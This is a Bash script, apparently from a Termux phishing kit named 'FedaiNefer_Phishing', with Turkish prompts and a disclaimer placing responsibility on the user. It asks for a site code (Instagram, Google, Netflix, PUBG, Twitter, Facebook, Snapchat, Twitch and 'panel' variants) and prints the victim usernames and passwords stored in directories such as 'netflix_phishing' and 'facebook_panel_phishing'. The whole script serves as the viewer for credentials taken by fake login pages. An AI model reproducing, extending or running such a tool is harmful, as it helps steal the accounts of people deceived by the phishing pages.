#!/bin/bash
#FedaiNefer
#FedaiNefer olarak hiçbir sorumluluk kabul etmem, sorumluluk kullanıcıya aittir
clear
echo -e "\e[0;49;91m
▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
"
chmod 777 verileri_getir.sh
echo -e "\e[31m"
read -p "Kodunuzu  Yazınız: " islem
echo " "
if [[ $islem == "instagram" ]]; then
	         	cd Siteler/instagram
                        clear
                        echo -e "\e[33mVeriler Geliyor...."
			sleep 2
                        echo " "
                        cat usernames.txt

elif [[ $islem == "google" ]]; then
	sleep 1
	echo ""
	echo -e "\e[33mVeriler Geliyor...."
	sleep 2
	echo -e "\e[37m"
	cd Siteler/google
	cat usernames.txt

elif [[ $islem == "netflix" ]]; then
	sleep 1
	echo ""
	echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cd Siteler/netflix_phishing
	cat kayit.txt

elif [[ $islem == "pubg" ]]; then
	sleep 1
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cd Siteler/pubg_phishing
        cat kayit.txt

elif [[ $islem == "twitter" ]]; then
	sleep 1
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cd Siteler/twitter_phishing
        cat kayit.txt

elif [[ $islen == "facebook" ]]; then
	sleep 1
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cd Siteler/facebook_phishing
	cat kayit.txt

elif [[ $islem == facebook_panel ]]; then
	sleep 1
	echo ''
	clear
	echo -e "\e[33mVeriler Geliyor...."
	sleep 2
	cd Siteler/facebook_panel_phishing
	clear
	cat kayit.txt

elif [[ $islem == instagram_panel ]]; then
        sleep 1
	echo ''
	echo -e "\e[33mVeriler Geliyor...."
	sleep 2
	cd Siteler/instagram_panel_phishing
	clear
	cat kayit.txt

elif [[ $islem == snapchat ]]; then
	sleep 1
	echo " "
	echo -e "\e[33mVeriler Geliyor...."
        sleep 2
	cd /data/data/com.termux/files/home/FedaiNefer_Phishing/Siteler/snapchat
	clear
	cat log.txt

elif [[ $islem == twitch ]]; then
	sleep 1
        echo " "
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        cd /data/data/com.termux/files/home/FedaiNefer_Phishing/Siteler/twitch
        clear
        cat log.txt

else
	echo -e '\033[31;40;1mİslem Numaranızı Kontrol Ediniz'
        sleep
        bash verileri_getir.sh

fi
